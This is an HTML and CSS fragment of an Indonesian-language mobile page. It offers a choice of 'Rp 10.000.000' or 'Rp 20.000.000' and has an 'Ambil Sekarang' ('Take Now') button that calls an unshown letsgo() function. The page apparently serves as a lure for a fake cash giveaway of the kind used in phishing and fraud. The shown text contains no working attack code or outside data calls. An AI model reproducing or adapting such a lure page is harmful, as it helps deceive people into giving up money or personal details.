...
.radio-item label {
	display: block;
	padding: 14px 30px;
	background: rgb(36,166,228);
background: linear-gradient(200deg, rgba(36,166,228,1) 20%, rgba(17,142,234,1) 70%, rgba(6,111,213,1) 100%);
...
<center>
 <img id="video"
    ...
    height="35%"
    autoplay
    muted control loop style=" width: 100%; height: 30%; display: block; background-color: #000; position: fixed; top: 0; left: 0; right: 0; z-index: -99" preload="metadata" src="https://medialampung.disway.id/upload/34a051d975de193ff4b8261385b9d77f.jpg" type="img/jpeg">
<br/>
<div style="width: 100%; height: 30%; display: block; background-color: #5EAFE7; position: fixed; top: 28%; left: 0; right: 0; border-radius:  0px 0px 0px 0px; border-top: 0px inset #fff;"></div>
<div style="width: 100%; height: 30%; display: block; background-color: #E8EBF3; position: fixed; top: 28%; left: 0; right: 0; border-radius: 25px 25px 0px 0px; border-top: 2px inset #fff;"></div>
</center>

<!-- partial:index.partial.html -->
<form style="margin-top: 100px; height: 40px; padding-top: 0px; margin-bottom: 60px; text-align: center; font-size: 12px; background-color: #f5f5f5; border: 1px inset #ffffff; background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgs9noak-LZncfEBhke-42CMPYCJNvJLq6BYEUG_maM4ry3pOULJc8T2GamrDbR_DFO2K1QKMlGLwpMKo_irlloCwpHfevIy0QtpBEr5JkxfqJhF_KQIVZt-cD6w3vjCfHgbkwo6LjgU7AYBFpv5gb_tKQjTGIxpV2xga2KY6OAn8CsJ5EiOqhYEbK-WdE/s2160/AddText_06-03-04.25.20.png); background-position: cover; background-size: 100%">
   

 </form>   

 
<form style="margin-top: -100px; border-top: 1px solid #118EEA; height: 100px; background: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHG8bz71IvIJl3PSWe5SPQf2uqQRQd7iX915m31vSQDrIrovNA6ILfIsJj7ePkpIAgn7SBUDGkNctPgm1V0Wj1g1NZCq50Ayw-2r8S0ekfxNwrUpaZ_3rDwwk46KJ8T6ro1LZDWKkFXKdQoV-TGaaFrytMF_60ahkXcBghNf5oSjwqA01os0L4TqOFPx4/s2000/AddText_04-03-07.31.42.png);
    background-position: 100% 100%;
    background-size: 100% 100%; background-color: #f5f5f5; outline: 1px solid #118EEA; text-shadow: 0 1px 1px rgba(888, 999, 255, 10.75);box-shadow: rgba(6, 24, 24, 0.99) 0px 0px 0px 2px, rgba(6, 24, 4, 10.65) 0px 4px 6px -1px, rgba(255, 255, 255, 0.08) 0px 1px 0px inset; border-radius: 25px 0px 25px 0px">
    
 <div style="position: absolute; left: 0; right: 0; margin: 0px auto">
		<div class="radio-item" ><input name="radio" id="radio1" type="radio" required><label for="radio1"> 𝗥𝗽 𝟭𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬 </label>
		<div class="radio-item"><input name="radio" id="radio2" type="radio"><label for="radio2" required> 𝗥𝗽 𝟮𝟬.𝟬𝟬𝟬.𝟬𝟬𝟬  </label>
		</div>
	</div>
</div>
</form>
...
<br/>
<button type="" onclick="letsgo()" style="width: 90%; height: 50px; border-radius: 50px; border: none; box-shadow: rgba(99, 99, 99, 0.4) 1px 2px 8px 1px; background: rgb(36,166,228);
background: linear-gradient(90deg, rgba(36,166,228,1) 0%, rgba(17,142,234,1) 50%, rgba(6,111,213,1) 100%); color: #ddd; font-size: 17px; font-weight: 400; cursor: pointer;
    text-shadow: 1px 2px 0 #000;box-shadow: rgba(0, 0, 0, 1.0) 0px 1px 3px;">Ambil Sekarang</button>   
